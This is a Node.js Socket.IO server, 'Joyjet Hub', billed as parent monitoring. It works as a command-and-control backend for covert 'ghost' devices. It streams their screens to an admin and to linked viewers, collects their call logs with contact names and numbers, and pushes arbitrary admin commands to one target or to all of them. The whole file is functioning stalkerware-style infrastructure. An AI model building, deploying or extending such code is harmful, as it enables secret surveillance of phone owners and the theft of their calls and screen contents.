require('dotenv').config(); 
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const axios = require('axios');

const app = express();
const server = http.createServer(app);

// 1. HIGH-PERFORMANCE ENGINE CONFIG
// HD frames require larger buffer. Origin "*" is necessary for mobile apps.
const io = new Server(server, {
  maxHttpBufferSize: 1e8, // 100MB for HD frames
  pingInterval: 10000,    // Faster detection of mobile disconnects
  pingTimeout: 5000,
  cors: {
    origin: "*", 
    methods: ["GET", "POST"],
    credentials: true
  }
});

// 2. STATE MANAGEMENT
const PUBLIC_URL = process.env.PUBLIC_URL || "https://joyjet-server.onrender.com";
const ADMIN_KEY = process.env.ADMIN_SECRET_KEY; 
let viewers = new Map(); // Store viewer state { name, hidden, socketId }

// 3. RENDER.COM KEEP-ALIVE
// Prevents the server from "sleeping" on the free tier
setInterval(async () => {
  try {
    await axios.get(PUBLIC_URL);
    console.log('--- System Heartbeat: Success ---');
  } catch (err) {
    console.log('--- System Heartbeat: Pulse Sent ---');
  }
}, 840000); // 14 Minutes (Render timeout is 15 mins)

// 4. MAIN COMMUNICATIONS HUB
io.on('connection', (socket) => {
  console.log(`[Link] Connected: ${socket.id}`);

  // ROLE & PERMISSION SYSTEM
  socket.on('claim_role', (data) => {
    if (!data.name) return;
    const nameLower = data.name.trim().toLowerCase();
    const providedKey = data.key;

    // A. ADMIN: Full System Access
    if (nameLower === "admin") {
      if (providedKey === ADMIN_KEY) {
        socket.join("admin_room");
        socket.emit('role_assigned', { role: 'ADMIN', name: "SYSTEM_MASTER" });
        console.log(`[Auth] Admin Access Granted: ${socket.id}`);
      } else {
        socket.emit('system_alert', { msg: "ACCESS DENIED: INVALID KEY" });
        socket.disconnect();
      }
    } 
    // B. VIEWER: Parent Monitoring
    else if (!nameLower.includes('_')) {
      viewers.set(socket.id, { name: nameLower, hidden: false });
      socket.join(`viewer_room_${nameLower}`);
      socket.emit('role_assigned', { role: 'VIEWER', name: data.name });
      console.log(`[Auth] Viewer Registered: ${data.name}`);
    } 
    // C. GHOST: Background Node
    else {
      socket.join("ghost_nodes");
      socket.emit('role_assigned', { role: 'GHOST', name: data.name });
      io.to("admin_room").emit('system_alert', { msg: `Node [${data.name}] is now Online.` });
    }
  });

  // STEALTH MODE: Toggle for Viewers
  socket.on('toggle_visibility', (data) => {
    if (viewers.has(socket.id)) {
        let v = viewers.get(socket.id);
        v.hidden = data.hidden;
        viewers.set(socket.id, v);
        console.log(`[Privacy] ${v.name} Visibility: ${data.hidden ? 'Hidden' : 'Visible'}`);
    }
  });

  // SCREEN RELAY: Optimized for high-frequency data
  socket.on('screen_frame', (payload) => {
    // payload: { ghostName: string, frame: base64 }
    
    // Relay to Admin (Volatile = don't queue if laggy)
    io.to("admin_room").volatile.emit('screen_frame', payload);
    
    // Relay to assigned Parent (Viewer)
    viewers.forEach((vData, vSocketId) => {
      if (!vData.hidden) {
        const prefix = vData.name + "_";
        if (payload.ghostName.toLowerCase().startsWith(prefix)) {
          io.to(`viewer_room_${vData.name}`).volatile.emit('screen_frame', payload);
        }
      }
    });
  });

  // SENSOR & ACTIVITY SYNC
  socket.on('ghost_activity', (payload) => {
    if (payload.type === 'CALL_LOG_SYNC') {
        payload.data.forEach(call => {
            const logEntry = {
                timestamp: new Date().toLocaleTimeString(),
                message: `CALL: ${call.name} (${call.number}) | Type: ${call.type} | Duration: ${call.duration}s`,
                name: payload.name
            };
            io.to('admin_room').emit('activity_log', logEntry);
        });
    } else {
        io.to('admin_room').emit('activity_log', payload);
    }
  });

  // COMMAND SYSTEM: Admin -> Target
  socket.on('admin_command', (data) => {
    // data: { targetId: string, cmd: string }
    if (socket.rooms.has("admin_room")) {
        if (data.targetId) {
            io.to(data.targetId).emit('admin_command', data.cmd);
        } else {
            socket.broadcast.emit('admin_command', data.cmd);
        }
    }
  });

  // CLEANUP
  socket.on('disconnect', () => {
    viewers.delete(socket.id);
    console.log(`[Unlink] Disconnected: ${socket.id}`);
  });
});

// BASE ENDPOINT
app.get('/', (req, res) => res.send('Joyjet Hub: Active'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`>>> MASTER HUB OPERATIONAL ON PORT ${PORT} <<<`));
